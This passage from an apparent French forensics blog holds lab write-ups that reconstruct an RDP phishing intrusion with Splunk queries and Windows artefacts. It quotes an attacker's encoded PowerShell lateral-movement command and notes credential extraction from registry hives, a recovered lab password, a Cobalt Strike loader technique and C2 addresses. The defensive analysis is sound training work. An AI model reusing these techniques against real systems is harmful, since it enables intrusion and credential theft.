[NTFS]\\[root]\\Windows\\System32\\SECURITY\u0026#34; --system \u0026#34;C:\\C___NONAME [NTFS]\\[root]\\Windows\\System32\\SYSTEM\u0026#34; LOCAL Parfait, on a récupéré le hash du mot de passe de l\u0026rsquo;utilisateur en question, on peut ensuite le bruteforce :\nMaintenant qu\u0026rsquo;on a son mot de passe on peut déchiffrer les credentials via l\u0026rsquo;outil DataProtectionDecryptor :\nIl existe aussi une façon non intentionnel de trouver le mot de passe du user :\nEffectivement, si on va dans l\u0026rsquo;historique des commandes powershell, on peut retrouver le moment ou le créateur du challenge a créé les users :\nRéponse : Administrator:C@mv@0s3rv3r\nQuestion 6 #\rQuand l\u0026rsquo;application Remote Desktop Connection a-t-elle été exécutée pour la dernière fois ? (UTC)\nPour répondre à cette question on va se pencher sur les artéfacts Prefetch.\nLe Prefetch est un mécanisme conçu pour accélérer le lancement des applications couramment utilisées en conservant certaines données relatives aux exécutions précédentes. Windows stocke ces informations sous forme de fichiers .pf dans le dossier suivant C:\\Windows\\Prefetch\\.\nChaque fichier .pf contient notamment :\nle nom de l’exécutable le nombre de fois où l\u0026rsquo;application a été lancée les timestamps de dernière exécution les chemins vers les fichiers associés et bibliothèques chargées durant le démarrage du processus Dans le cas d\u0026rsquo;une connexion RDP, l’exécutable utilisé est généralement MSTSC.EXE. L’analyse du fichier Prefetch associé (MSTSC.EXE-XXXXXX.pf) permet ainsi de vérifier si une connexion RDP a été établie depuis cette machine, ainsi que le moment précis de son lancement.\nPour les charger dans Timeline Explorer on doit les parser, pour cela on va utiliser PECmd :\nPECmd.exe -d \u0026#34;C:\\___NONAME [NTFS]\\[root]\\Windows\\Prefetch\u0026#34; --csv \u0026#34;C:\\Users\\username\\Desktop\\HTB\\latus\u0026#34; Et effectivement on retrouve les informations de lancement de MSTSC.exe :\nRéponse : 2024-06-28 13:56:48\nQuestion 7 #\rQuand l\u0026rsquo;application Remote Desktop Connection a-t-elle été fermée pour la dernière fois ? (UTC)\nPremièrement on va chercher du côté du UserAssist (dans la registry hive NTUSER.dat) se situant : NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\.\nCette clé conserve l’historique d’utilisation des applications exécutées par l’utilisateur notamment :\nle nombre d’exécutions d’un programme le moment précis de la dernière exécution de l\u0026rsquo;application le moment précis où l\u0026rsquo;application a été fermée ou terminée (dernier arrêt du processus) Ces informations sont stockées dans des sous-clés encodées via ROT13 mais heureusement Registry Explorer nous rend tout cela lisible :\nMais ce qui nous choque en premier c\u0026rsquo;est la différence entre la valeur \u0026ldquo;Last Executed\u0026rdquo; contenu dans le UserAssist et la \u0026ldquo;Last Run\u0026rdquo; dans le Prefetch.\nPourquoi cette divergence entre Prefetch et UserAssist ?\nPrefetch (.pf) : Enregistre les exécutions directement au niveau du processus (mstsc.exe). Le compteur augmente à chaque chargement du processus en mémoire, peu importe comment il est démarré. UserAssist (registre) : Enregistre uniquement les exécutions effectuées par interaction directe de l’utilisateur (ex : clic sur l’icône, menu Démarrer, barre de recherche, raccourci). Ne comptabilise pas nécessairement les exécutions indirectes (exécution via ligne de commande, exécution automatique, scripts, etc.). Donc on fait fausse route ici.\nOn peut alors se pencher sur la clé BAM (HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings\\) qui enregistre explicitement la durée de vie des applications.\nEn effet, BAM maintient pour chaque exécutable un historique précis comprenant :\nle dernier moment d’exécution (lancement de l’application) le moment précis de fermeture (terminaison du processus) Vous pouvez retrouver plus d\u0026rsquo;informations sur les artéfacts RDP ici : https://www.thedfirspot.com/post/lateral-movement-remote-desktop-protocol-rdp-artifacts\nRéponse : 2024-06-28 14:01:26\nQuestion 8 #\rQuelle a été la durée de l\u0026rsquo;avant-dernière session RDP ?\nPour répondre à cette question on va se pencher sur l\u0026rsquo;ActivitiesCache.db :\nAprès l\u0026rsquo;avoir chargé dans Timeline Explorer on voit bien les différentes \u0026ldquo;duration\u0026rdquo; des sessions RDP :\nPour une raison inconnue, la réponse prend -1 sec.\nRéponse : 00:11:42\nQuestion 9 #\rQuand l\u0026rsquo;attaquant a-t-il déconnecté la dernière session Remote Desktop (RDP) ? (UTC)\nPour cela on va aller voir le fichier \u0026ldquo;Default.rdp\u0026rdquo; contenu dans le ...\\Documents\\ de l\u0026rsquo;utilisateur. En effet, ce fichier est généré automatiquement par Windows lorsqu\u0026rsquo;une connexion RDP est établie via l\u0026rsquo;application MSTSC.\nOn peut y retrouver :\nl\u0026rsquo;adresse IP ou nom du serveur utilisé lors de la dernière connexion RDP le nom d’utilisateur ayant été utilisé pour la connexion le paramètres graphiques (résolution, couleurs, etc.) l\u0026rsquo;options de partage des périphériques locaux (presse-papiers, disques locaux, imprimantes, etc.) les paramètres de performances (qualité graphique, compression, etc.). Mais on peut aussi voir quand est-ce que le fichier a été modifié pour la dernière fois :\nRéponse : 2024-06-28 13:51:03\nQuestion 10 #\rQuelle est la taille du bureau à distance configuré ?\nOn retourne sur le fichier Default.rdp et on y retrouve :\nRéponse : 1920:1080\nQuestion 11 #\rQuel outil l\u0026rsquo;attaquant a-t-il utilisé pour explorer le réseau après s\u0026rsquo;être déplacé latéralement vers 192.168.70.133 ?\nPour répondre à cette question on va devoir chercher du côté du cache bitmap RDP.\nLors de l’analyse des sessions utilisant le protocole RDP (Remote Desktop Protocol) sous Windows, le cache bitmap RDP constitue un artefact souvent négligé, mais pourtant très pertinent en forensic.\nCe cache permet d\u0026rsquo;améliorer les performances des sessions RDP en stockant localement des sections d\u0026rsquo;écran déjà affichées. Ainsi, lorsqu\u0026rsquo;une partie de l\u0026rsquo;écran reste statique, le système peut rapidement récupérer l\u0026rsquo;image en mémoire locale plutôt que de la recharger à distance, ce qui fluidifie l\u0026rsquo;expérience utilisateur.\nD\u0026rsquo;un point de vue forensic, ce cache peut représenter une source précieuse d\u0026rsquo;informations. En effet, l\u0026rsquo;analyse des fichiers du cache bitmap peut révéler des détails sensibles sur les activités de l\u0026rsquo;utilisateur, telles que les fenêtres ouvertes, les contenus affichés ou les actions réalisées pendant la session RDP.\nSi vous voulez plus d\u0026rsquo;informations je vous invite à lire le post : https://www.cyberengage.org/post/analyzing-and-extracting-bitmap-cache-files-from-rdp-sessions.\nOn retrouve ces fichiers ici C:\\Users\\user\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\.\nPour les parser \u0026amp; exporter on va utiliser le tool de l\u0026rsquo;ANSSI \u0026ldquo;BMC-Tools\u0026rdquo;.\nEnsuite, on va utiliser le tool de la BSI Bund \u0026ldquo;RdpCacheStitcher\u0026rdquo; pour les analyser :\nEn reconstruisant, on voit donc bien que l\u0026rsquo;attaquant a utilisé \u0026ldquo;NetBScanner\u0026rdquo; pour scanner le réseau.\nRéponse : NetBScanner\nQuestion 12 #\rQuand l\u0026rsquo;attaquant a-t-il supprimé le journal des événements ? (UTC)\nOn revient sur ce qu\u0026rsquo;on avait trouvé lors de la question 1 :\nRéponse : 2024-06-28 14:03:25\nQuestion 13 #\rÀ quelle heure l\u0026rsquo;attaquant a-t-il déconnecté la session vers 192.168.70.129 ? (UTC)\nSi on regarde juste après l\u0026rsquo;effacement des events log, on voit bien un \u0026ldquo;An account was logged off\u0026rdquo; :\nRéponse : 2024-06-28 14:03:53\nLab terminé !\n","date":"10 mars 2025","externalUrl":null,"permalink":"/blog-cyber/posts/latus/","section":"Posts","summary":"Scénario #\rLe 28 juin, notre client a détecté des sessions RDP non autorisées, sans déploiement de PAM, dans leur environnement.","title":"Latus","type":"posts"},{"content":"","date":"2 mars 2025","externalUrl":null,"permalink":"/blog-cyber/tags/cyberdefenders/","section":"Tags","summary":"","title":"Cyberdefenders","type":"tags"},{"content":"\rScénario #\rUn employé informatique d’InfiniTech Solutions a signalé une activité inhabituelle associée à son compte e-mail. Lors de l’investigation, il a été découvert que les identifiants professionnels de l’employé avaient été divulgués lors d’une récente fuite de données.\nL’employé avait utilisé son adresse mail professionnelle pour s’inscrire sur une plateforme tierce, ce qui a exposé ses identifiants. Des acteurs malveillants ont exploité ces identifiants pour se connecter au compte mail de l’employé et envoyer des e-mails de phishing à d’autres employés de l’organisation.\nVotre tâche est d’enquêter sur cet incident en analysant les logs, en déterminant l’étendue de l’attaque, en identifiant si des utilisateurs ont interagi avec les mails de phishing, et en découvrant l’impact de la campagne de phishing sur le réseau.\nSetup #\rPour ce scénario d\u0026rsquo;investigation, nous allons principalement utiliser Splunk Search pour analyser les logs. En complément, nous utiliserons d’autres outils tels que xml.onlineviewer, Cyberchef ainsi que VirusTotal.\nRappels #\rSplunk est une plateforme d’analyse qui permet de collecter, indexer et rechercher des données générées par des systèmes, applications et équipements réseau. Il récupère ses logs via divers mécanismes tels que des agents installés sur les endpoints, l’ingestion de fichiers de logs ou encore des API.\nUne fois collectées, les données sont indexées, ce qui permet de les organiser et de faciliter la recherche. Splunk utilise le langage de recherche SPL (Search Processing Language) pour interroger ces données.\nInitial Access #\rQuestion 1 #\rQuel compte de messagerie a été compromis et utilisé pour lancer l\u0026rsquo;attaque ?\nPremièrement, vérifions les \u0026ldquo;sourcetype\u0026rdquo; disponibles sur notre\nindex=\u0026#34;main\u0026#34; | stats count by sourcetype Les sourcetypes dans Splunk sont des étiquettes qui indiquent le type de données ou l\u0026rsquo;origine des événements collectés.\nPour répondre à cette question, on va se focus sur les \u0026ldquo;syslog\u0026rdquo; premièrement. En effet, les syslog regroupent les logs générés par divers équipements et contiennent généralement des informations détaillées sur les activités système et de sécurité.\nPour aller plus vite et éviter de s\u0026rsquo;inonder d\u0026rsquo;informations, on va chercher avec un regex pour uniquement afficher les adresses mails :\n* sourcetype=syslog | regex _raw=\u0026#34;[\\w\\.-]+@[\\w\\.-]+\\.\\w+\u0026#34; On voit beaucoup de logs, pour nous faciliter la tâche, on va compter combien de fois chaque adresse mail apparaît et afficher les résultats sous forme de tableau :\n* sourcetype=syslog | rex field=_raw \u0026#34;(?\u0026lt;email\u0026gt;[\\w\\.-]+@[\\w\\.-]+\\.\\w+)\u0026#34; | stats count by email | sort -count | head 10 | rename count AS \u0026#34;Number of occurrences\u0026#34;, email AS \u0026#34;Email address\u0026#34; On peut même visualiser ça sous forme de graphique :\nRéponse : twhite@infinitechsolutions.xyz\nQuestion 2 #\rAprès avoir identifié le compte compromis, l\u0026rsquo;attaquant a envoyé des mails de phishing à d\u0026rsquo;autres employés de l\u0026rsquo;entreprise. Quels sont les noms de ces employés, classés par ordre chronologique et séparés par des virgules ?\nLe formatage de log d\u0026rsquo;envoi de mail est comme cela :\nUser [email_expéditeur] [adresse_IP]; Message [ID_message] for [email_destinataire] Pour la recherche on va donc faire :\n* sourcetype=syslog \u0026#34;User twhite@infinitechsolutions.xyz\u0026#34; | rex field=_raw \u0026#34;Message \u0026lt;[^\u0026gt;]+\u0026gt; for (?\u0026lt;recipient\u0026gt;[\\w\\.-]+@[\\w\\.-]+\\.\\w+)\u0026#34; | table _time recipient | sort _time | stats list(recipient) as recipients | eval recipients=mvjoin(recipients, \u0026#34;, \u0026#34;) Cette requête nous permet d\u0026rsquo;identifier et lister chronologiquement les destinataires en question.\nEn effet, on y sélectionne le user du compte compromis et on utilise un regex pour extraire et stocker dans une variable l\u0026rsquo;adresse mail du destinataire.\nEnsuite, on trie les résultats par ordre chronologique et on format le résultat pour que ça soit bien lisible.\nRéponse : rnichols,llopez,gbaker,ahall\nQuestion 3 #\rQuel est le nom de la pièce jointe malveillante envoyée depuis le compte compromis ?\nCette question m\u0026rsquo;a posé plus de problème que ce que à quoi je m\u0026rsquo;attendais. En effet, premièrement j\u0026rsquo;ai cherché :\n* sourcetype=syslog \u0026#34;User twhite@infinitechsolutions.xyz\u0026#34; | regex _raw=\u0026#34;for (rnichols|llopez|gbaker|ahall)@infinitechsolutions\\.xyz\u0026#34; Néanmoins aucune trace de pièce jointe. Je me suis donc dit \u0026ldquo;mhmm je ne dois pas être sur le bon sourcetype, je vais rechercher les autres.\u0026rdquo;\nJ\u0026rsquo;ai donc recherché :\nindex=* \u0026#34;twhite@infinitechsolutions.xyz\u0026#34; | stats count by sourcetype Uniquement syslog, je suis donc sur le bon sourcetype. Je continue donc à réfléchir et je me dis \u0026ldquo;je vais bypass le problème de formatage et simplement chercher des extensions de fichier\u0026rdquo;\nJe demande donc à ChatGPT de me faire une liste d\u0026rsquo;extension et je me retrouve avec cette requête :\nindex=* sourcetype=syslog twhite@infinitechsolutions.xyz | rex field=_raw \u0026#34;attachment=(?\u0026lt;malicious_attachment\u0026gt;[\\w\\.-]+\\.(exe|zip|pdf|docx|xlsm|js|vbs|scr|bat))\u0026#34; | table _time malicious_attachment | sort _time Toujours rien, pas de pièce jointe.\nÉtant toujours bloqué, j\u0026rsquo;ai décidé de réfléchir différemment. Le titre du lab est \u0026ldquo;Midnight RDP\u0026rdquo;, ce qui me fait penser à l\u0026rsquo;APT nommée \u0026ldquo;Midnight Blizzard\u0026rdquo;.\nDans mes recherches, je suis tombé sur un article intitulé \u0026ldquo;How Midnight Blizzard Uses Malicious .RDP Files to Exploit Windows Systems: A Technical Guide\u0026rdquo; (Yua Mikanana).\nBon, au vu du nom du lab, c\u0026rsquo;est évident. Je cherche donc \u0026ldquo;.RDP\u0026rdquo; et j\u0026rsquo;obtiens le fichier :\nRéponse : cloud zerotrust compliance.rdp\nExecution #\rQuestion 1 #\rAprès avoir analysé les interactions des utilisateurs, quel employé a téléchargé et exécuté la pièce jointe malveillante ?\nOn change de sourcetype, on passe sur les WinEventLog.\nLes WinEventLog correspondent aux journaux d\u0026rsquo;événements de Windows, qui enregistrent diverses activités du système (comme les erreurs, les avertissements, les informations de sécurité ou les activités applicatives) pour permettre un suivi et une analyse des événements sur un système Windows.\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; cloud zerotrust compliance.rdp On voit donc bien le username de l\u0026rsquo;utilisateur qui a téléchargé ce fichier : C:\\Users\\rnichols\\Downloads\\cloud zerotrust compliance.rdp\nRéponse : rnichols\nQuestion 2 #\rSur la machine DC, une balise DLL a été exécutée par l\u0026rsquo;attaquant en mémoire. Quels sont les 10 premiers octets du hachage SHA-256 de ce fichier DLL malveillant ?\nPremièrement, listons les DLL ayant un lien avec PowerShell sur le DC :\nindex=* sourcetype=xmlwineventlog \u0026#34;Powershell\u0026#34; | search host=\u0026#34;DC01\u0026#34; | rex field=_raw \u0026#34;(?\u0026lt;file\u0026gt;\\b\\w{6,8}\\.\\w{3}\\b)\u0026#34; | search file=\u0026#34;*dll\u0026#34; On remarque que le script complet est trop long pour être enregistré en un seul événement. Il est donc découpé en segments. On peut le voir grâce au MessageNumber :\nLes deux événements partagent le même ActivityID {0B39225B-3C43-0001-5078-390B433CDB01} ainsi que d’autres identifiants, ce qui montre qu’ils appartiennent à la même exécution de script.\nLe premier segment (MessageNumber = 1) contient le début du script, incluant la configuration de l’environnement PowerShell et la définition de fonctions telles que func_get_proc_address et func_get_delegate_type.\nLe dernier segment (MessageNumber = 33) contient la fin du script, notamment la partie qui effectue le décodage d’une chaîne Base64 (XORée avec la clé 35) et qui alloue de la mémoire pour exécuter le code décodé.\nEnsemble, ces segments reconstituent l’intégralité d’un payload qui cherche vraisemblablement à injecter et exécuter du code en mémoire.\nLe script, une fois reconstitué, décode un payload obfusqué (d’abord en Base64, puis XORé avec 35) et utilise des fonctions Windows natives (comme VirtualAlloc via GetProcAddress et GetDelegateForFunctionPointer) pour allouer de la mémoire et exécuter le code malveillant.\n[...] $var [...] -bxor 35 [...] On peut le reconstituer via une recherche Splunk :\nindex=* sourcetype=xmlwineventlog EventID=4104 0B39225B-3C43-0001-5078-390B433CDB01 | stats values(ScriptBlockText) as Script by SystemTime | table Script On peut ensuite désencoder le script via Cyberchef :\nOn retrouve notre DLL en question :\nEnfin, on extrait le fichier et on récupère son hash :\nRéponse : 0ee6bc20a7f855d881cce962de09c77960ea5c85ca013e3d123fce61109ff8c5\nPersistence #\rQuestion 1 #\rAprès l\u0026rsquo;établissement de la connexion malveillante, un fichier a été déposé sur le système. Quel est le nom de ce fichier déposé ?\nOn sait que le fichier .rdp a été exécuté vers 20:45:27 (cf. question 1 de la partie Execution).\nOn va donc chercher à partir de ce moment-là.\nPremièrement, j\u0026rsquo;ai tenté de rechercher dans Splunk des téléchargements via des commandes PowerShell (Invoke-WebRequest, curl, etc.), mais ça n\u0026rsquo;a rien donné.\nJ\u0026rsquo;ai donc modifié ma recherche :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort — _time Alors pourquoi cela fonctionne ?\nVoici le détail de l’événement :\nLe champ TerminalSessionId=3 suggère fortement que l\u0026rsquo;utilisateur était connecté via une session RDP, car :\nLa session 0 est souvent utilisée par SYSTEM. Les sessions interactives locales commencent généralement à 1. Les sessions RDP prennent souvent des ID plus élevés (2, 3, etc.). explorer.exe est le processus principal de l’interface graphique Windows et agit comme un lanceur pour les programmes démarrés par un utilisateur interactif.\nScénarios possibles expliquant ce comportement :\nSession interactive (RDP ou non) : Si rnichols s\u0026rsquo;est connecté via RDP, explorer.exe s’est lancé en tant que shell utilisateur et a exécuté les programmes définis dans Startup (ztssvc.exe). Cette situation se produit même sans RDP si l’utilisateur se connecte physiquement ou via un service comme runas. Exécution automatique au démarrage de l\u0026rsquo;utilisateur : ztssvc.exe étant dans Startup, il est exécuté dès que l\u0026rsquo;utilisateur se connecte (que ce soit en local ou via RDP). Injection ou Persistance via explorer.exe : Si un attaquant a persisté un malware via Startup, explorer.exe va automatiquement exécuter ce binaire dès qu\u0026rsquo;un utilisateur se connecte. Exploit ou Exécution forcée par un attaquant : Si explorer.exe a été compromis (via injection DLL ou autre technique), il aurait pu être utilisé pour exécuter ztssvc.exe. Réponse : ztssvc.exe\nQuestion 2 #\rPour conserver un accès à long terme, l\u0026rsquo;attaquant a créé une tâche planifiée sur la machine compromise. Quel est le nom de cette tâche ?\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; EventCode=4698 OR EventCode=4702 | search user=\u0026#34;rnichols\u0026#34; | table _time EventCode TaskName Command User | rename EventCode as \u0026#34;Event ID\u0026#34;, TaskName as \u0026#34;Scheduled Task\u0026#34;, Command as \u0026#34;Executed Command\u0026#34; | sort _time Question 3 #\rDans le cadre de sa stratégie de persistance, l\u0026rsquo;attaquant a créé un nouveau compte utilisateur. Quel est le nom de ce compte non autorisé ?\nToujours avec la même requête que pour la question 1 :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort — _time On peut y trouver une commande PowerShell encodée qui paraît très suspecte :\nOn prend cette commande et on la décode via Cyberchef :\nRéponse : Administrator\nQuestion 4 #\rPour faciliter l\u0026rsquo;accès à distance, l\u0026rsquo;attaquant a modifié les paramètres du bureau à distance. Quel est le nom de la clé de registre qui détermine si les connexions RDP (Remote Desktop Protocol) sont autorisées ?\nAyant déjà investigué et administré pas mal de Windows, je connaissais déjà la réponse. Néanmoins, voici comment la trouver :\nOn recherche toujours les commandes PowerShell avec -EncodedCommand, car l\u0026rsquo;attaquant en a exécuté plusieurs :\nOn y trouve cette commande :\nRéponse : fDenyTSConnections\nQuestion 5 #\rDes recherches supplémentaires ont révélé la création d\u0026rsquo;un nouveau compte d\u0026rsquo;utilisateur sur le DC. Quel est le nom de ce compte ?\nOn peut supposer que cela a été fait de la même manière que sur l\u0026rsquo;autre host. On recherche donc :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; host=\u0026#34;DC01\u0026#34; \u0026#34;-EncodedCommand\u0026#34; Réponse : rniclos\nPrivilege Escalation #\rQuestion 1 #\rEn examinant la technique d\u0026rsquo;escalade de privilège, quels sont les 6 derniers octets du CLSID de l\u0026rsquo;interface COM privilégiée que l\u0026rsquo;attaquant a exploitée ?\nLe CLSID est un identifiant unique global (GUID) utilisé par Windows COM (Component Object Model) pour identifier des objets COM dans le registre.\nLes attaquants utilisent des CLSID de COM Interfaces privilégiées pour exécuter du code avec des privilèges élevés :\nIls exploitent des COM Objects mal configurés pour escalader leurs privilèges. Un attaquant peut créer, manipuler ou appeler une interface COM privilégiée* via regsvr32.exe, powershell, mshta.exe ou rundll32.exe. Ici, on sait que le malware est ztssvc.exe. On va donc rechercher tout EventCode \u0026ldquo;1\u0026rdquo; (création de processus) lié à l\u0026rsquo;exécution de ztssvc.exe et filtrer uniquement sur les IntegrityLevel \u0026ldquo;High\u0026rdquo; :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; EventCode=1 | search Image=\u0026#34;*ztssvc.exe*\u0026#34; | search IntegrityLevel=\u0026#34;High\u0026#34; | table _time User CommandLine IntegrityLevel ParentCommandLine | sort _time Réponse : 7CE93B6DC937\nQuestion 2 #\rPour élever ses privilèges, l\u0026rsquo;attaquant a déposé un autre fichier sur le système. Quel est le nom de ce fichier ?\nOn refait la même commande et on vérifie tout ce qui s\u0026rsquo;est passé après le téléchargement du premier fichier (ztssvc.exe) :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | search NOT ParentCommandLine=\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort — _time Réponse : Akagi64.exe\nDefense Evasion #\rQuestion 1 #\rL\u0026rsquo;attaquant a cherché à modifier le comportement du système pour affaiblir les paramètres de sécurité. Quel est le nom de la clé de registre qui régit les paramètres de l\u0026rsquo;invite du Contrôle de compte d\u0026rsquo;utilisateur (UAC) pour les utilisateurs administratifs ?\nOn trouve la réponse dans les commandes PowerShell encodées déjà observées :\nRéponse : ConsentPromptBehaviorAdmin\nQuestion 2 #\rPour éviter d\u0026rsquo;être détecté, l\u0026rsquo;attaquant a déplacé la balise dans un répertoire protégé du système. Quel est le nom de ce fichier malveillant déplacé ?\nS’il y a eu déplacement, il devrait y avoir un événement de création ou de renommage de fichier (Event ID 11 ou 2).\nindex=* sourcetype=xmlwineventlog EventCode=11 OR EventCode=2 \u0026#34;rnichols\u0026#34; | search TargetFilename=\u0026#34;C:\\\\Windows\\\\System32\\\\*\u0026#34; OR TargetFilename=\u0026#34;C:\\\\Windows\\\\SysWOW64\\\\*\u0026#34; OR TargetFilename=\u0026#34;C:\\\\ProgramData\\\\*\u0026#34; | table _time User TargetFilename ProcessName | sort _time Réponse : Amazon ZeroTrust Compl.exe\nDiscovery #\rQuestion 1 #\rEn déterminant la première action de l\u0026rsquo;attaquant sur la machine compromise, quelle a été la première commande exécutée pour recueillir des informations sur le système ?\nSachant que la machine a été compromise à 20:45:27 (cf. question 1 de la partie Execution), on va chercher à partir de ce moment-là :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | search NOT ParentCommandLine=\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort — _time Réponse : whoami /groups\nLateral Movement #\rQuestion 1 #\rQuel outil l\u0026rsquo;attaquant a-t-il utilisé pour se déplacer latéralement vers le DC ?\nEncore une fois, on va devoir investiguer les commandes PowerShell encodées, cette fois-ci celles émises par Amazon ZeroTrust Compl.exe.\npowershell -nop -exec bypass -EncodedCommand UwBlAHQALQBJAHQAZQBtACAAVwBTAE0AYQBuADoAXABsAG8AYwBhAGwAaABvAHMAdABcAEMAbABpAGUAbgB0AFwAVAByAHUAcwB0AGUAZABIAG8AcwB0AHMAIAAtAFYAYQBsAHUAZQAgACIARABDADAAMQAuAGEAZAAuAGkAbgBmAGkAbgBpAHQAZQBjAGgAcwBvAGwAdQB0AGkAbwBuAHMALgB4AHkAegAiACAALQBGAG8AcgBjAGUA Cette commande modifie les paramètres de Windows Remote Management (WinRM) sur IT01 pour faire confiance à DC01.ad.infinitechsolutions.xyz pour les connexions distantes. C’est un bon indicateur de mouvement latéral via PowerShell Remoting (WinRM).\nRéponse : WinRM\nCommand \u0026amp; Control #\rQuestion 1 #\rEn remontant le fil des activités de l\u0026rsquo;attaquant, quelle était l\u0026rsquo;adresse IP à partir de laquelle les courriels malveillants ont été envoyés ?\nOn revient aux toutes premières questions en cherchant le user qui a envoyé le phishing :\nindex=* sourcetype=syslog \u0026#34;User twhite@infinitechsolutions.xyz\u0026#34; Réponse : 3.78.253.99\nQuestion 2 #\rPuisque cloud zerotrust compliance.rdp a été exécuté sur IT01 et qu’on connaît l’adresse IP de l’expéditeur de mail, on peut tester directement :\nindex=* sourcetype=xmlwineventlog (EventCode=1 OR EventCode=3) | search host=\u0026#34;IT01\u0026#34; | search DestinationPort=3389 AND DestinationIp=3.78.253.99 | table _time User DestinationIp DestinationPort | sort _time Réponse : 3.78.253.99:3389\nQuestion 3 #\rL\u0026rsquo;analyse a révélé que le fichier déposé fonctionne comme une balise Cobalt Strike. Quel est le point de terminaison du serveur de commande et de contrôle (C\u0026amp;C) avec lequel cette balise communique ?\nPremièrement vérifions bien quel fichier est le Cobalt Strike beacon :\nEnsuite, on continue l\u0026rsquo;investigation en recherchant à quelle IP/port s’est connecté Amazon ZeroTrust Compl.exe :\nindex=* sourcetype=xmlwineventlog EventCode=3 | search Image=\u0026#34;*Amazon ZeroTrust Compl.exe*\u0026#34; | search NOT DestinationIp=\u0026#34;\u0026#34; | table _time User Image DestinationIp DestinationPort Protocol | sort _time (EventCode 3 correspond à une connexion réseau établie par un processus sur une machine Windows)\nRéponse : 3.78.244.11:8080\nQuestion 4 #\rEn examinant la configuration de la DLL, quelle valeur est associée à la clé \u0026lsquo;C2Server\u0026rsquo; qui dirige la communication de la balise ?\nOn retourne sur VirusTotal et on retrouve cette information dans l\u0026rsquo;onglet \u0026ldquo;Behavior\u0026rdquo;.\nRéponse : 3.78.244.11,/dot.gif\nLab terminé !\n","date":"2 mars 2025","externalUrl":null,"permalink":"/blog-cyber/posts/midnight-rdp/","section":"Posts","summary":"Scénario #\rUn employé informatique d’InfiniTech Solutions a signalé une activité inhabituelle associée à son compte e-mail.","title":"Midnight RDP Lab","type":"posts"},{"content":"","date":"2 mars 2025","externalUrl":null,"permalink":"/blog-cyber/tags/splunk/","section":"Tags","summary":"","title":"Splunk","type":"tags"},{"content":"","date":"2 mars 2025","externalUrl":null,"permalink":"/blog-cyber/tags/threat-hunting/","section":"Tags","summary":"","title":"Threat Hunting","type":"tags"},{"content":"","date":"19 mai 2024","externalUrl":null,"permalink":"/blog-cyber/tags/android-forensic/","section":"Tags","summary":"","title":"Android Forensic","type":"tags"},{"content":"","date":"19 mai 2024","externalUrl":null,"permalink":"/blog-cyber/tags/autopsy/","section":"Tags","summary":"","title":"Autopsy","type":"tags"},{"content":"","date":"19 mai 2024","externalUrl":null,"permalink":"/blog-cyber/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":"\rScénario #\rNous avons réussi à confirmer la localisation de l\u0026rsquo;acteur malveillant qui a compromis le réseau WiFi de notre gouvernement.\nRécemment, un raid à l\u0026rsquo;aube dans le cadre de l\u0026rsquo;OP ERADICATE a été mené à une adresse dans la capitale vélorienne et une quantité considérable d\u0026rsquo;éléments de preuve a été saisie. On notera en particulier un appareil Android appartenant à l\u0026rsquo;agent, dont on pense qu\u0026rsquo;il se trouvait sur le lieu de l\u0026rsquo;attaque.\nNous avons besoin de votre expertise pour analyser cet appareil et répondre aux questions détaillées ci-dessous. Vous n\u0026rsquo;avez pas beaucoup de temps, une réunion du COBR vélorien a été organisée pour discuter de vos résultats\u0026hellip;\nFichiers #\ropshieldwall2.zip contenant \u0026ldquo;EVIDENCE-CASE-RAVENSKIAN-AGENT-002\u0026rdquo; où on le retrouve le dossier \u0026ldquo;data\u0026rdquo; et \u0026ldquo;storage\u0026rdquo; d\u0026rsquo;un Android Cela nous laisse pas mal de marge de manœuvre, en effet, le /data contient énormément d\u0026rsquo;informations telles que :\nCheatsheet SANS FOR585\rAvant propos #\rAvant de commencer, voici quelques informations importantes sur Android :\nLes données utilisateur peuvent être stockées en interne et en externe sur Android. Les données internes sont enregistrées dans la mémoire flash NAND, une mémoire non volatile qui conserve les données même en cas de coupure d\u0026rsquo;alimentation. La NAND stocke le bootloader, le système d\u0026rsquo;exploitation et les données utilisateur. Les données des applications sont stockées sur la mémoire flash NAND ou sur la carte SD.\nAndroid est basé sur des variantes des branches LTS (long-term support) du Kernel Linux. Avec Android v8 (Oreo), Google a 